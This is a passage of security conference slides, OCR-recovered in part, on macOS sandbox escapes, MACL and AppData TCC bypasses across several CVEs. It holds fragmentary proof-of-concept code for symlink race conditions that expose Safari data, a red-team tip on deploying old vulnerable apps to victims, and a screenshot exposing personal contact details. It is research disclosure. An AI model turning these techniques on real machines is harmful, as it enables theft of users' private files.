*fileURL = [ :filePath];
[pasteboard :@[fileURL]];
[ 15.0];
*filePaths = [pasteboard
for ( *fileURL in filePaths) {
‘Copied file path: %@", [fileURL 1);
«newContent #!/bin/sh\nopen —a Calculator
*error = H
if ([newContent : [fileURL ] :NSUTF8St rringEncoding :Gerror]) {
@''Replaced the content of the copied file. The copied file's quarantine file should be 0082");
‘Failed to replace the content of the copied file: [error 1);
£ sh-3.2$ sw_vers ;csrutil status
return Q; ProductName: macOS
ProductVersion: 14.5
BuildVersion: 23F79
System Integrity Protection status: enabled.
sh-3.2$
sh-3.2$
sh-3.2$
sh-3.2$ ./compile2.sh
sh-3.2$
sh-3.2$
sh-3.2$ ./main.app/Contents/MacOS/main
/Users/sg@/ Library/Containers/com.example.copyFileFromClipboard2/Data
2024-06-13 15:04:51.962 main[10145:809989] Copied file path: /Users/§§§@j/Library/Containers/com.example.copyFileFromClipboard2/Data/hello.txt
2024-06-13 15:04:51.965 main[10145:809989] Replaced the content of the copied file. The copied file's quarantine file should be 0082
sh-3.2$
sh-3.2$ xattr -1 /Users/qQgg§/Library/Containers/com.example.copyFileFromClipboard2/Data/hello.txt
com.apple.TextEncoding: utf-8;134217984
com.apple.quarantine: 0082;666a9a13;main;
sh-3.2$
sh-3.2$
sh-3.2$ xattr -1 /Users/@@§/Library/Containers/com.example.copyFileFromClipboard2/Data/hello2.txt
com.apple.quarantine: 0086; 666a9a@e;main;
sh-3.2$
```

## Slide 86

# SBX Through Launching a Non-Sandboxed App

01

02

Identify a vulnerability that allows the creation of an app folder without the quarantine attribute

Discover a vulnerability or utilize a feature to create an executable file with a quarantine flag other than 0086

#BHUSA @BlackHatEvents

## Slide 87

# Section 2 : Conclusion

- Traditionally, an arbitrary folder creation vulnerability is considered harmless and cannot lead to any exploitable outcome

- However, on macOS, by combining some exploit methods to modify the quarantine flag, such a seemingly useless vulnerability can be transformed into a universal sandbox escape

- I first discovered the arbitrary folder creation vulnerability and spent two weeks figuring out how to exploit it. Do not ignore seemingly useless vulnerabilities, especially when analyzing a new OS

#BHUSA @BlackHatEvents

## Slide 88

# Good Luck

- I believe the system still contains many APIs that allow for unauthorized folder creation

- Enjoy！

- Good luck for your bug hunting！

#BHUSA @BlackHatEvents

## Slide 89

# Answering

• Gergely Kalman (@gergely_kalman) found a SBX vulnerability: <u>https://gergelykalman.com/CVE-202332364-a-macOS-sandbox-escape-by-mounting.html</u>

- : ) The answer is: Yes, but we need to do a bit more if we want to achieve a general sandbox escape

#BHUSA @BlackHatEvents

## Slide 90

# Targets

Camera

Microphone

Screen Recording

RCE

Root LPE

SIP Bypassing

Arbitrary Files Read and Write

#BHUSA @BlackHatEvents

## Slide 91

# Section 3:  A Permission Granting Mechanism on macOS

#BHUSA @BlackHatEvents

## Slide 92

# Section 3: A Permission Granting Mechanism on macOS

- Next, we need to discuss the newly introduced AppData TCC in macOS 14 as it hinders our previous exploit

- Before that, we first need to understand a crucial permission granting mechanism on macOS, MACL（ _Mandatory Access Control List_ ）

- AppData TCC is based on MACL

#BHUSA @BlackHatEvents

## Slide 93

# What does the MACL look like?

TextEdit doesn’t have
permission to access
`~/Documents/flag.txt`

Double-click flag.txt in
Finder
What happened

TextEdit gains access to
flag.txt

#BHUSA @BlackHatEvents

## Slide 94

# What does the MACL look like?

TextEdit doesn’t have
Double-click flag.txt in
permission to access
Finder
`~/Documents/flag.txt`
I believe
a permission granting
mechanism is at work here What happened

TextEdit gains access to
flag.txt

#BHUSA @BlackHatEvents

## Slide 95

# Two Ways to Limit File Access

1. Use a database to record who can access the file

- For example, use TCC.db to record who can access the Desktop

- Precisely controlling access to every single file is very costly

2. Mark the file with some properties

- More suitable for precise control over file access permissions

#BHUSA @BlackHatEvents

## Slide 96

# What does the MACL look like?

Mark the file with some properties: _Mandatory Access Control List_

#BHUSA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
bisek hat
USA 2024
Documents % xattr -l ./flag.txt
com.apple.lastuseddate#Ps:
0000 RONGANOATESHOUTOOROONOOND THGEECCRIROONOONOONOO eee sh-3.2$ # Double-Click on flag.txt, then use TextEdit modify flag.txt's content
sh-3.2$
sh-3.2$ xattr -1 flag.txt
com.apple.quarantine: 0086;65046658;HelloMac; com.apple.TextEncoding: utf—8; 134217984
com.apple.lastuseddate#PS:
com.apple.macl:
Mark the file with some properties: 2030 08 G2 GB GO 2B QO OO OO OO 20 OO OO 20 00 00 OO... esses eee e eee
com.apple.metadata: kMDLabel_rjy3kg6k5f2gxj5elxtmqln4ey:
com.apple.quarantine: 0@82;665425b1;TextEdit;
```

## Slide 97

# GuluBadFinder : CVE-2023-42850

#BHUSA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
bisek hat
USA 2024
CVE-2023-42850
Apple has assigned CVE-2023-42850 to this issue. CVEs are unique IDs used
to uniquely identify vulnerabilites. The following describes the impact and
description of this issue:
e Impact: An app may be able to access sensitive user data
e Description: The issue was addressed with improved permissions logic.
support.apple.com/HT 213984 >
```

## Slide 98

# GuluBadFinder : CVE-2023-42850

**01**

**02**

**03**

Finder uses the default app to open the file based on its Uniform Type Identifier

macOS generates the MACL attribute to allow the default app to access the file

Finder informs the app to open the file

#BHUSA @BlackHatEvents

## Slide 99

# GuluBadFinder : CVE-2023-42850

Text Here

#BHUSA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
bisek hat
USA 2024
, M™@™, & Documents % cat flag.txt
cat: flag.txt: Operation not permitted
‘gi— “B® Documents % open -—a TextEdit ./flag.txt
The document “flag.txt” could
not be opened. You don’t have
permission.
To view or change permissions, select
the item in the Finder and choose File >
Get Info.
Documents % cat flag.txt
.txt: Operation not permitted
Documents % open -a TextEdit ./flag.txt
Documents % open -a Finder ./flag.txt
Documents % ||
B flag.txt
```

## Slide 100

# GuluBadFinder : CVE-2023-42850

- If we can replace the default file handler, we can trick Finder into automatically granting our application access to any file when it opens the file

- • E.g. :

   - Safari / History.db

   - Messages / chat.db

   - etc.

#BHUSA @BlackHatEvents

## Slide 101

GuluBadFinder : CVE-2023-42850 The app can register supported file types in Info.plist in this way:

#BHUSA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
bisek hat
USA 2024
The app can register supported file types in in this way:
<key>CFBundleDocumentTypes</key>
<array>
<dict>
<key>CFBundleTypeName</key>
<string>SQLite Database</string>
<key>LSItemContentTypes</key>
<array>
<string>public.database</string>
</array>
<key>LSHandlerRank</key>
<string>Owner</string>
</dict>
<dict>
<key>CFBundleTypeName</key>
<string>Text Document</string>
<key>LSItemContentTypes</key>
<array>
<string>public.plain-text</string>
</array>
<key>LSHandlerRank</key>
<string>Owner</string>
</dict>
```

## Slide 102

# GuluBadFinder : CVE-2023-42850

<u>https://github.com/Lord-Kamina/SwiftDefaultApps</u>

The UTI of Database is dyn.ah62d4rv4ge80k2u

#BHUSA @BlackHatEvents

## Slide 103

# Title

Text Here

#BHUSA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
@ OpenVPN Connect.app
@ Pages.app
Photo Booth.app
Photos.app
@ poc.app
® Podcasts.app
@ Preview.app
[2c] PyCharm.app
@ QQapp
@ QQRK.app
# QtScrcpy.app
@ QuickTime Player.app
** Raspberry Pi Imager.app
@® Reminders.app
Remix IDE.app
®@ Safari.app
@ Shadawenrke¥-NG@ ann
sh-3.2# sw_vers ; csrutil status| |
Date Modified
March 14, 2022 at 13:24
February 6, 2023 at 12:41
June 15, 2023 at 18:08
June 15, 2023 at 18:08
Today at 17:28
June 15, 2023 at 18:08
June 15, 2023 at 18:08
April 8, 2021 at 14:18
July 28, 2022 at 00:24
May 29, 2023 at 12:29
February 16, 2023 at 17:21
July 10, 2022 at 15:01
June 15, 2023 at 18:08
February 4, 2022 at 01:53
June 15, 2023 at 18:08
December 3, 2021 at 22:52
July 11, 2023 at 12:23
Nawamhar 18-2010 at 19:57
Size
49 bytes
641.8 MB
4.4MB
40.3 MB
418 KB
43.7 MB
9.4 MB
1.01 GB
2.15 GB
761.9 MB
220.7 MB
60.7 MB
6.5 MB
48.4 MB
20.2 MB
274.5 MB
13.3 MB
2aamA
Kind
Alias
Application
Application
Application
Application
Application
Application
Application
Application
Application
Application
Application
Application
Application
Application
Application
Application
Annlicatian
Q Search
beijia554517@sohu.com 2022/11/24
RL ah 2022 FERRE
MEME A! | WMI!
3150396792@189.cn = 2022/9/27
SHTMAROUAR—, HMR! F
EMD 8887! |
+86 170 9311 2590 2022/7/29
s (RBS) RAS KMCA FR
(AAR, OO, BOM, ave,
fanxiaolong_wj@126.com 2021/3/17
teeeeoeoeooeoe
Y OMEMA) BB.
boriquachic81@yahoo.com 2021/2/9
eee eoeooeoe
LY (sumiee vw) wy
christine.halling@msmc..... 2021/1/22
YREMA x EE
YRECKeRs BOOxnsY..
® 86829 >@?
o@ 4G
0 9
® Privacy & Security
Focus
@
@
vel
8
S
©
o @ Acces
8
9
)
8
8
2
To: christine.halling@msmc.edu
iMessage
Jan 22, 2021 at 20:34
DRM A & ARRAN
YREOReEE OOOnay
App Fi: www.8508999.com
VIP 28: www.302626.com (SB iX Sil EF Ait 5S 88 a as Bw He)
* SEM RAE BAR qq B:2993721277 SR
S DMMB 20%, BTU, HAS SERGIG HMR!
CBAALKR, AREMUBAA SE
SSKRY, BANE! &
HomeKit
Speech Recognition
Media & Apple Music
Files and Folders
Full Disk Access
Input Monitoring
Screen Recording
Passkeys Access for Web Browsers
Automation
App Management
Developer Tools
```

## Slide 104

# The Role of MACL

- For these security protections on file:

SIP > MACL > TCC

- As long as a file is tagged with the MACL attribute, even if it is protected by TCC, a permitted app can still access the file

#BHUSA @BlackHatEvents

## Slide 105

# Unpatched Vulnerabilities

**5** Relevant Vulnerabilities Still Awaiting Patches

#BHUSA @BlackHatEvents

## Slide 106

# Section 4: Everything you need to know about AppData TCC

#BHUSA @BlackHatEvents

## Slide 107

# Section 4: Everything you need to know about AppData TCC

- When a sandboxed app launches, Secinitd requests ContainerManagerd to create a private container folder in _~/Library/Containers_ for this app based on its bundle ID

- For example: _~/Library/Containers/gulucat.HelloMac/Data_

#BHUSA @BlackHatEvents

## Slide 108

# Data Folder

- The Data folder is the actual private container folder for the app

- It has the MACL attribute, which contains information about all apps allowed to access it

#BHUSA @BlackHatEvents

## Slide 109

# How to generate MACL: Based on macOS 14.5

- Secinitd registers the app container

- Apply MACL to the Data folder

#BHUSA @BlackHatEvents

## Slide 110

# _applyPrivacyProtectionExceptionPolicy

1. Trusted processes can access its private container folder

2. Apps developed by the same developer can access its private container folder

#BHUSA @BlackHatEvents

## Slide 111

Route 1 Demo : Info.plist of WeChat

WeType can access WeChat’s private container folder

#BHUSA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
bisek hat
USA 2024
WeType can access WeChat's private container folder
<key>NSDataAccessSecurityPolicy</key>
<dict>
<key>AllowPackages</key>
<array>
<string>88L2Q4487U</string>
</array>
<key>AllowProcesses</key>
<dict>
<key>88L2Q4487U</key>
<array>
<string>com.tencent.inputmethod.wetype</string>
</array>
</dict>
</dict>
```

## Slide 112

# Route 2 : DefaultSameTeamException

#BHUSA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
Q
black hat
USA 2024
1] IDA View-A x = P B x TE] Pseudocode-A x [O! Hex View-1 x [AJ Structureg
void __cdecl -[ASBMutableContainer (Protection) _applyDefaultSameTeamExceptionToDescr iptor: ] (
ASBMutableContainer *self,
3 SEL a2,
4 int a3)
5 it ntaine
; T/
> TI
> T/
1 = -[ASBMutableContainer ownerCode] ( , "“ownerCode");
= objc_retainAutoreleasedReturnValue(v4) ;
= objc_msgSend_O(v5, "teamIdentifier");
= objc_retainAutoreleasedReturnValue(v6) ;
5 objc_release_@(v5);
{
-[ASBMutableContainer (Protection) _registerExceptionToContainerAtFileDescriptor: forAllAppsFromTeam: ] (
' registerExceptionToContainerAtFileDescr ptor: forAllAppsFromTean —.
(u t)a3,
2 );
-[ASBMutableContainer (Protection) _registerExceptionToContainerAtFileDescriptor: forAllInstallPackagesFromTeam: ] (
ceptionToContainerAtFileDescriptor: forAllInstallPackagesFromTeam ~_—_
}
objc_release_0(v/7);
```

## Slide 113

# Analyze Sandbox.kext

Secinitd owns “ _com.apple.private.security.appcontainer-authority_ ”

#BHUSA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
Q
black hat
USA 2024
3
Secinitd owns “
; = copyin( , & , Ox28uLL);
Ll, if ( !(_DWORD)v4 )
{
{
= 0;
= AppleMobileFileIntegrity: :AMFIEntitlementGetBool (
(pre *)"com.apple.private.security.appcontainer-authority",
& ,
);
!
sandcastle_appcontainer_exception_validate_vnode;
goto LABEL_2;
```

## Slide 114

# Analyze Sandbox.kext

Different MACL generation strategies based on the type

#BHUSA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
bisek hat
USA 2024
Different MACL generation strategies based on the type
BULU LADCL Z,
{
= macl_record_app exception(vp, , , );
else
= macl_record_team_exception(vp, , );
goto LABEL_48;
}
{
LABEL_48:
= macl_record package exception(vp, , );
goto LABEL_2:
}
ARFI AS:
```

## Slide 115

# Analyze Sandbox.kext

##### Different MACL generation strategies based on the type

#BHUSA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
bisek hat
USA 2024
Different MACL generation strategies based on the type
=] IDA View-A XT] Pseudocode-8 XS) Strings XOl Hex View-7 XAT Structures x
__int64 _ fastcall macl_record_app_exception(__int64 al, _ int64 a2, _ int64 a3, __ int64 a4)
{
__int64 v7; // x0
__int64 v8; // x19
int64 v10[3]; // [xsp+Oh] [xbp-40h] BYREF
v7 = macl_copy_for_vnode(al, 1LL);
] return 12LL;
memset(v10, 0, 23);
q macl_app_exception_identifier_for_signed_code(a4, a2, a3, v10);
3 macl_add_entry(v8, 2LL, vi0, OLL, OLL, OLL);
q macl_release(v8) ;
» return OLL;
> }
sh-3.2$ xattr -l1 ~/Library/Containers/com.tencent.xinWeChat/Data
com.apple.macl:
```

## Slide 116

# Analyze Sandbox.kext

Different MACL generation strategies based on the type

#BHUSA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
bisek hat
USA 2024
Different MACL generation strategies based on the type
eres
int64 fastcall macl_record_team_exception(__int64 al, char *a2, char a3)
orgs ee
a
__int64 v5; // x¢
}  __int64 v6; // x20
_BYTE v7[23]; // [xsp+0 xbp-30 BYRE
B return 45LL;
Dt
5 = macl_copy_for_vnode(ai, 1LL);
} return 12LL;
memset(v7, 0, sizeof(v7));
b macl_team_exception_identifier(@, a2, (__int64)v7);
macl_add_entry(v6, B, (__int128 *)v7, ®, 0, 0);
macl_release(v6);
b
}
) return OLL;
}
sh-3.2$ xattr -1 ~/Library/Containers/gulucat.HelloMac/Data
com.apple.macl:
```

## Slide 117

# Analyze Sandbox.kext

Different MACL generation strategies based on the type

#BHUSA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
bisek hat
USA 2024
Different MACL generation strategies based on the type
__int64 _ fastcall macl_record_package _exception(__int64 al, __int64 a2, char a3)
__int64 v5; // x0
__int64 v6; // x19
__int64 v7[3]; // [xsp+Oh] [xbp-30h] BYREF
return 45LL;
{
v5 = macl_copy_for_vnode(al, 1LL);
return 12LL;
memset(v7, 0, 23);
macl_package_exception_identifier(a2, v7);
macl_add_entry(v6, 4LL, v7, OLL, OLL, OLL);
macl_release(v6) ;
return OLL;
}
sh-3.2$ xattr -1 gulucat.HelloMac/Data/
com.apple.macl:
```

## Slide 118

# Analyze Sandbox.kext

These MACL generation strategies are essentially similar, all involving SHA-256 hash calculations with some differences in the details

#BHUSA @BlackHatEvents

## Slide 119

# Abuse AppData TCC

**01**

**02**

Secinitd grants launching sandboxed apps access to specific folders

MACL can bypass all file TCC limitations

- If we can exploit AppData TCC, we can access arbitrary files with nearly FDA-level permissions, except we cannot modify TCC.db

#BHUSA @BlackHatEvents

## Slide 120

# GuluBadContainerManager : CVE-2023-42932

#BHUSA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
bisek hat
USA 2024
CVE-2023-42932
Apple has assigned CVE-2023-42932 to this issue. CVEs are unique IDs used
to uniquely identify vulnerabilites. The following describes the impact and
description of this issue:
e Impact: An app may be able to access protected user data
e Description: A logic issue was addressed with improved checks.
support.apple.com/HT 214036 >
```

## Slide 121

# GuluBadContainerManager : CVE-2023-42932

If _~/Library/Containers/gulucat.HelloMac/Data_ is a symbolic link,

Secinitd will still update the destination folder’s MACL attribute with the launching app’s teamID

#BHUSA @BlackHatEvents

## Slide 122

# GuluBadContainerManager : CVE-2023-42932 Patch

#BHUSA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
bisek hat
USA 2024
objc_release( );
objc_release( Ds
ll ( )objc_msgSend( > sDirectory") && !( )objc_msgSend( 7 ym k") )
objc_release( iH
objc_release( );
goto LABEL_13;
}
= ( )j__container_log_handle_for_category(1LL) ;
= j__objc_retainAutoreleasedReturnValue_22( ):
if ( !j__os_log_type_enabled_66( , OS_LOG_TYPE_ERROR) )
goto LABEL _40;
= 138412546;
= 2112!
= y a ea eri subdirectory doesn't target expectation cachetntry a node @
}
else
{
= ( )j__container_log_handle_for_category(1LL);
= j__objc_retainAutoreleasedReturnValue_22( );
if ( 1j__0s_log_type_enabled_66( , OS_LOG_TYPE_ERROR) )
{
ABEL_40:
objc_release( );
objc_release( );
goto LABEL_23;
= 138412546;
= 2112!
}
j___os_log_error_imp1_45(&dword_7FFBOD9FBO00, , OS_LOG_TYPE_ERROR, oa )& , Ox16u);
goto LABEL_40;
}
ARFI 12:
```

## Slide 123

# GuluBadContainerManager2 : CVE-2024-23215

#BHUSA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
bisek hat
USA 2024
CVE-2024-23215
Apple has assigned CVE-2024-23215 to this issue. CVEs are unique IDs used
to uniquely identify vulnerabilites. The following describes the impact and
description of this issue:
e Impact: An app may be able to access user-sensitive data
e Description: An issue was addressed with improved handling of temporary
files.
support.apple.com/HT 214061 >
support.apple.com/HT 214060 >
support.apple.com/HT214059 >
support.apple.com/HT214055 >
```

## Slide 124

# GuluBadContainerManager2 : CVE-2024-23215

The Container Manager first creates a temporary folder at _~/Library/Staging/{RANDOM_UUID}_

#BHUSA @BlackHatEvents

## Slide 125

# GuluBadContainerManager2 : CVE-2024-23215

After creation, rename the folder to _~/Library/Containers/{bundle_id}_

#BHUSA @BlackHatEvents

## Slide 126

# GuluBadContainerManager2 : CVE-2024-23215

- _~/Library/Staging_ was not protected by TCC. Anyone could access it

- Race Condition vulnerability here

- Before renaming, we could replace the _{RANDOM_UUID}/Data_ folder with a symbolic link

- As a result, the victim folder would be tagged with the malicious sandboxed app’s MACL attribute

#BHUSA @BlackHatEvents

## Slide 127

# GuluBadContainerManager2 CVE-2024-23215 PoC

#BHUSA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
black hat
USA 2024
GuluBadContainerManager2
CVE-2024-23215 PoC
main(int argc,
@autoreleasepool {
«homeDirectory
“watchDirectory = [homeDirectory ary/Staging"]
*linkTarget = [homeDirectory :@"Library/Safari"];
*LinkName = @"Data";
fileManager
if (1 [fileManager watchDirectory]) {
(@"The direct d not ex , watchDirectory);
return 1;
(@"Watching directory: %@", watchDirectory);
Create a dispatch unning the open command asynchronously
dispatch_queue_t queue (DISPATCH_QUEUE_PRIORITY_DEFAULT, 0);
)(2 * NSEC_PER_SEC)), queue, “{
containermanager2");
/ Keep track of existing directories to identify ne
existingDirs = [fileManager
xexistingDirsSet = [ rexistingDirs] ;
ones
:watchDirectory
while ( ») x8
@autoreleasepool {
«currentDirs = [fileManager
«currentDirsSet = [ currentDirs] ;
newDirsSet = [ :currentDirsSet]
[newDirsSet sexist ingDirsSet] ;
:watchDirectory
for ( *newDir in newDirsSet) {
*newDirPath = [watchDirectory
IL isDir;
([fileManager :newDirPath
[newDirPath
:newDir] ;
or symlink if it
if ([fileManager dataPath]) {
[fileManager :dataPath
Attempt to create a symlink, handling a race condition
error
(! [fileManager :dataPath
:linkTarget :Serror]) {
If a race condition occur
, e symlink
[fileManager :dataPath
[fileManager :LinkTarget
symlink af r ndition: %@ -> %@", dataPath, LinkTarget);
nLink: > 8", dataPath, LinkTarget) ;
```

## Slide 128

# GuluBadContainerManager2 CVE-2024-23215 Patch

- _~/Library/Staging_ moves to _~/Library/ContainerManager/Staging_

- The folder is protected by TCC and we cannot access the temporary files any more

#BHUSA @BlackHatEvents

## Slide 129

# GuluBadContainerManager3 : CVE-2024-27872

#BHUSA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
bisek hat
USA 2024
CVE-2024-27872
Apple has assigned CVE-2024-27872 to this issue. CVEs are unique IDs used
to uniquely identify vulnerabilites. The following describes the impact and
description of this issue:
« Impact: An app may be able to access protected user data
¢ Description: This issue was addressed with improved validation of symlinks.
support.apple.com/HT 214119 >
```

## Slide 130

# GuluBadContainerManager3 : CVE-2024-27872

01 02 03
Secinitd requests
Secinitd requests ContainerManagerd creates
Sandbox.kext to update the
ContainerManagerd to create the container folder in MACL attribute of the Data
folder
the app container folder ~/Library/Containers/

#BHUSA @BlackHatEvents

## Slide 131

# GuluBadContainerManager3 : CVE-2024-27872

01 02 03
Secinitd requests
Secinitd requests ContainerManagerd creates
Sandbox.kext to update the
ContainerManagerd to create the container folder in MACL attribute of the Data
folder
the app container folder ~/Library/Containers/
Data folder is not protected
Data folder is protected

_Timing Window_

#BHUSA @BlackHatEvents

## Slide 132

# GuluBadContainerManager3 : PoC Step 1

01

Monitor Data folder creation; if found, replace with a symbolic link

**02**

ContainerManagerd prevents the launch of the malicious sandboxed app due to the patch for _GuluBadContainerManager CVE-2023-42932_

- But Secinitd still requests Sandbox.kext to update the Data folder's MACL attribute

- As a result, the folder pointed to by the symbolic link has been erroneously assigned the MACL attribute

#BHUSA @BlackHatEvents

## Slide 133

# GuluBadContainerManager3 : PoC Step 1

#BHUSA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
bisek hat
USA 2024
GuluBadContainerManager3
PoC Step
watch.py
subprocess
sys
os
nit
command
log', ‘stream’,
f'process == “cont
Log'
style sys
Open a subproces
th subprocess.
#L POP to proc
wt :
tine pr
i Query
os.
Query
os.
("Monitoring
(bundle_identifier):
predicate
ainermanagerd"',
to execute the command and stream the outpu
(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text
ess the output line by line in real-time
oc. stdout. 0
result: count = 1, error =' line:
(f"mv ~/Library/Containers/{bundle_identifier}/Data
("Exploit 1.")
line:
-/Library/Containers/{bundle_identifier}/Data 2>/
result: count = 0, error ='
(f"ln -s ~/Library/Safari
("Exploit done.")
dev/null’
ped by user.
as e:
(f"Unexpecte
_—name__ —main__
(sys.argv) 2
bundle_identifier
# print (bundle
("Error: Bun
(1)
{e}")
d error
sys.argv[1]
tifier)
(bundle_identifier)
dle identifier not vided.")
-/Library/Containers/{bundle_identifier}/Data2 2>/dev/nul
```

## Slide 134

# GuluBadContainerManager3 : PoC Step 2

_1. Replace the symbolic link with a normal Data folder_

- Next time we launch the malicious sandboxed app, ContainerManagerd won't block it

_2. Register the sbpl_

- If not, the app cannot access the victim folder because of the sandbox restrictions even if it is on the folder's MACL trusted list

#BHUSA @BlackHatEvents

## Slide 135

#BHUSA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
black hat
USA 2024
rk Foundation -f
encoding="UTF-8"?>
<!DOCT Apple//DTD PLIST 1.0//EN" “http www. app Le. com/DTDs
apple. se ty. app-sand ey
apple. se ty y-exception. sbpl</key
<string> file-read* file-write* (require-a vnode-type RE
</array>
-/entitlements.plist
UUID in t idleId
?xml ver i TF ?
DOCTYPE plist P ~0//EN http ww e ym
version=
y>CFBundlel
tring>con ger3. $uuid</stri
<key>CFBundle
<string>main</s >
<key>LSMinimumSystemVers ion</key
tring>10.13< ing>
main.app
main.app/Contents/Mac0S/
./main.app/Contents/Info. plist]
Li entitlements ./entitlements.plist main.app
watch.py com.example.badcontainermanager3. $uuid
»/main.app
3
output
$( /Library/Safari 2>&1)
output
Failed, try again.
10
/Library/Containers/com. example. badcontainermanager3.$uuid/Data
p ~/Library/Containers/com. example. badcontainermanager3. $uuid/Data
«/main.app
Success. Now we can access rary/Safari. Of course, we can a
Check /tmp, you will find History.db of Safari.
Check brary/Safari, you w find a file name YOUHAVEBEENHACK
)
Pre
ertyList
york Cocoa main.m —o main.app/Contents/MacOS/main
-dtd
ages
```

## Slide 136

#BHUSA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
Date Modified Date Modified
ScreenRecordings 4
Application Scripts
openvpn-connect-postinstall-1709000701.log
openvpn-connect-preinstall-1709000697.log
studentd © com.apple.launchd.QNkeQoA6lB
Autosave Information  powerlog
Keychains
Homekit
HTTPStorages
Translation
Cookies
LaunchAgents
(& IdentityServices
Saved Application State
DataDeliveryServices
Assistant
Suggestions
UnifiedAssetFramework
Passes
Safari
® sh-3.2$ touch ~/Library/Safari/hello
sh-3.2$ sw_vers ;csrutil status
```

## Slide 137

# Hello Mac 15

In macOS 15, the group containers of third-party apps are protected by AppData TCC too

##### Additionally, the _“~/Library/Group Containers_ ” folder is not writable

#BHUSA @BlackHatEvents

## Slide 138

# Have You Identified an Attack Surface in AppData TCC ?

#BHUSA @BlackHatEvents

## Slide 139

# Have You Identified an Attack Surface in AppData TCC ?

Purpose
Protect the data of
third-party applications
Effect
Allows access only to
AppData TCC
trusted applications
Flaw
Does not provide
developers with an option
to create a blocklist

#BHUSA @BlackHatEvents

## Slide 140

# AllowList vs. BlockList

AllowList BlockList
Only apps on the allowlist are permitted Apps on the blocklist are not permitted

#BHUSA @BlackHatEvents

## Slide 141

# AllowList vs. BlockList

AllowList BlockList
Only apps on the allowlist are permitted Apps on the blocklist are not permitted
What if the trusted app
no longer trusted?
#BHUSA

#BHUSA @BlackHatEvents

## Slide 142

# Have You Identified an Attack Surface in AppData TCC ?

- If any trusted application has an N-Day vulnerability, like the dylib hijacking vulnerability, the attacker can download the old version, achieve LPE, and then access the sensitive files of the latest app

- A vulnerability that only affected specific versions has turned into a persistent issue that developers cannot fix

#BHUSA @BlackHatEvents

## Slide 143

Allowlist Can Not Block This Exploit _The developer can configure the allowlist to limit who can access the folder, but it can not block this exploit_

- The allowlist is a way to allow other processes to access the sandboxed app’s private container folder. Whatever the configuration is, the sandboxed app itself can still access the private container folder

- Even if the allowlist works, it only compares the teamID in the allowlist. The vulnerable older version of the sandboxed app has a valid teamID, so you cannot block its launch

#BHUSA @BlackHatEvents

## Slide 144

# To Red Teams

_Collect these vulnerable old version apps_

1. Achieve RCE on the victim's macOS, intending to escalate privileges or steal sensitive data, but discover that the data is protected by AppData TCC

2. The protected data is guarded by a sandboxed app, and the latest version is secure with no LPE vulnerabilities

3. However, an older, vulnerable version can still be exploited. Download the vulnerable app to the victim's macOS to achieve LPE

#BHUSA @BlackHatEvents

## Slide 145

# To Apple : Suggestions

_1. Create a blocklist_

- If the app has an n-day vulnerability, developers can add the vulnerable app's cdhash to the blocklist

- These blocked older version apps cannot access the latest app's private container folder

_2. If the current running app version is lower than the version that was last run, prompt the user with an alert_

#BHUSA @BlackHatEvents

## Slide 146

# TCCD Has a Similar Attack Surface

- If an application has had multiple privilege escalation vulnerabilities in its history, it is advisable not to grant excessive TCC permissions to that application for security reasons

- Apple has introduced several security mechanisms, such as trustcache, to address these issues

- However, these mechanisms currently focus mainly on the security of Apple's apps and do not yet cover third-party apps

#BHUSA @BlackHatEvents

## Slide 147

# Targets

Camera

Microphone

Screen Recording

RCE

Root LPE

SIP Bypassing

Arbitrary Files Read and Write

#BHUSA @BlackHatEvents

## Slide 148

#BHUSA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
@ QuickTime Player File Edit View Window Help Q S&S MondJul8 18:52
»~. tmp — 80x24
ae he Fecal l= ~~ aan © G \sh-3.2$ sw_vers ;csrutil status
ProductName: macOS
Name “| Date Modified Size Kind ProductVersion: 15.0
> 9) AdhocSignatureCache May 20, 2024 at 13:36 -- Folder Syckon arcu: . p 24A5279h bled
@ TCC.db Jun 24, 2024 at 17:11 74KB Document System Integrity Protection status: enabled.
sh-3.2$ rm -rf /tmp/photo.jpg; ./camera; open /tmp/photo. jpg| |
```

## Slide 149

# Unpatched Vulnerabilities

**Over 30** Relevant Vulnerabilities Still Awaiting Patches

#BHUSA @BlackHatEvents

## Slide 150

# Summary

#BHUSA @BlackHatEvents

## Slide 151

# Takeaways

- Finding an arbitrary folder creation vulnerability on macOS is equivalent to finding a sandbox escape vulnerability

- MACL: A permission granting mechanism on macOS

- Everything you need to know about AppData TCC

- Abusing N-Day vulnerabilities in outdated versions of installed third-party apps to bypass TCC

#BHUSA @BlackHatEvents

## Slide 152

# Comparison with Other OS: Android

- Android uses a similar MAC approach – SELinux and DAC approach based on UID and GID

- Sensitive access enforced by XML-based permission and signatures

- Sandboxed processes run in isolated context, with limited access to resources (drivers, services, syscalls etc)

- Escaping the sandbox by attacking binder driver and core syscalls

- Or application-relevant IPCs (Chrome IPC for renderer process)

#BHUSA @BlackHatEvents

## Slide 153

# Comparison with Other OS: HarmonyOS Next

- APL: Ability Privilege Level for apps: normal, system_basic, system_core

- Permission can be granted by User_grant, System_grant

- Permission can be dynamically assigned by ACL

